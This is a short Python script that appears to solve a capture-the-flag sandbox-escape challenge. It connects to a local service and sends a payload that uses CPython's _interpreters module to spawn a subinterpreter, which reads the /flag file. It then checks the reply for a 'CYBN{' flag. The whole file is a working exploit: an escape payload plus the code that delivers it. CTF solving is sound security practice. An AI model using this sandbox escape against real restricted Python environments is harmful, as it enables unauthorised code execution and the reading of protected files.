#!/usr/bin/env python3
import socket, sys, time

PAYLOAD = (
    'i = __import__("_interpreters"); '
    'sub = i.create(); '
    'i.exec(sub, \'print(open("/flag").read())\')'
)


def solve(host="127.0.0.1", port=7000):
    s = socket.create_connection((host, port), timeout=10)
    s.settimeout(2.0)
    out = b""

    def drain():
        nonlocal out
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass

    drain()
    s.sendall(PAYLOAD.encode() + b"\n")
    time.sleep(0.4)
    drain()
    s.close()
    return out.decode(errors="replace")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 7000
    text = solve(host, port)
    print(text)
    sys.exit(0 if "CYBN{" in text else 1)
